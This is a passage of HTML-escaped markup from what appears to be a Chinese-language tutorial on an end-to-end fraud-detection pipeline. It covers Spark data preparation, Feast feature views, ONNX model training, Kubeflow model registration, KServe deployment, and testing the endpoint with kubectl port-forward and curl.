&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; data_preparation
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;podman build -t fraud-detection-e2e-demo-data-preparation:latest .
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;管道工作流&#34;&gt;管道工作流
&lt;/h2&gt;&lt;h3 id=&#34;1-使用spark进行数据准备&#34;&gt;1. 使用Spark进行数据准备
&lt;/h3&gt;&lt;p&gt;Spark作业执行关键数据准备步骤：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;合并数据集&lt;/li&gt;
&lt;li&gt;类型转换和特征工程&lt;/li&gt;
&lt;li&gt;添加时间戳列&lt;/li&gt;
&lt;li&gt;计算时间点特征&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-使用feast进行特征工程&#34;&gt;2. 使用Feast进行特征工程
&lt;/h3&gt;&lt;p&gt;定义特征视图示例：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;transactions_fv&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FeatureView&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;transactions&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;entities&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;transaction&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;schema&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;user_id&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dtype&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;feast&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;types&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;distance_from_home&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dtype&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;feast&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;types&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Float32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;# ...其他特征...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;online&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;source&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;transaction_source&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;3-模型训练&#34;&gt;3. 模型训练
&lt;/h3&gt;&lt;p&gt;训练脚本：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;加载特征&lt;/li&gt;
&lt;li&gt;分割数据集&lt;/li&gt;
&lt;li&gt;构建和训练神经网络&lt;/li&gt;
&lt;li&gt;导出ONNX格式模型&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;4-模型注册&#34;&gt;4. 模型注册
&lt;/h3&gt;&lt;p&gt;将训练好的模型注册到Kubeflow模型注册表：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nd&#34;&gt;@dsl.component&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;base_image&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PIPELINE_IMAGE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;register_model&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;model&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Model&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;NamedTuple&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;outputs&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;model_name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;model_version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;registry&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ModelRegistry&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;server_address&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://model-registry-service.kubeflow.svc.cluster.local&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8080&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;author&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;fraud-detection-e2e-pipeline&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;user_token&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;non-used&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;is_secure&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# ...注册逻辑...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;5-使用kserve进行实时推理&#34;&gt;5. 使用KServe进行实时推理
&lt;/h3&gt;&lt;p&gt;创建KServe InferenceService：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;inference_service&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;kserve&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;V1beta1InferenceService&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;api_version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kserve&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;constants&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;KSERVE_GROUP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/v1beta1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;kind&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;InferenceService&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;metadata&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;V1ObjectMeta&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;model_name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;-&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;job_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;namespace&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kserve&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;utils&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get_default_target_namespace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;spec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kserve&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;V1beta1InferenceServiceSpec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;predictor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kserve&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;V1beta1PredictorSpec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;service_account_name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;kserve-sa&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;containers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;V1Container&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;inference-container&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;n&#34;&gt;image&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rest_predictor_image&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;python&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;predictor.py&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;--model-name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;model_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;--model-version&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;model_version_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;p&#34;&gt;)]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;测试实时端点&#34;&gt;测试实时端点
&lt;/h2&gt;&lt;p&gt;端口转发：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kubectl -n kubeflow get pods -l &lt;span class=&#34;nv&#34;&gt;component&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;predictor -o &lt;span class=&#34;nv&#34;&gt;jsonpath&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;{.items[*].metadata.name}&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tr &lt;span class=&#34;s1&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep &lt;span class=&#34;s1&#34;&gt;&amp;#39;^fraud-detection&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; head -n1 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; xargs -I &lt;span class=&#34;o&#34;&gt;{}&lt;/span&gt; kubectl port-forward -n kubeflow pod/&lt;span class=&#34;o&#34;&gt;{}&lt;/span&gt; 8081:8080
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;发送请求：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -X POST http://localhost:8081/v1/models/onnx-model:predict &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;-H &lt;span class=&#34;s2&#34;&gt;&amp;#34;Content-Type: application/json&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;-d &lt;span class=&#34;s1&#34;&gt;&amp;#39;{&amp;#34;user_id&amp;#34;: &amp;#34;user_0&amp;#34;}&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;结论&#34;&gt;结论
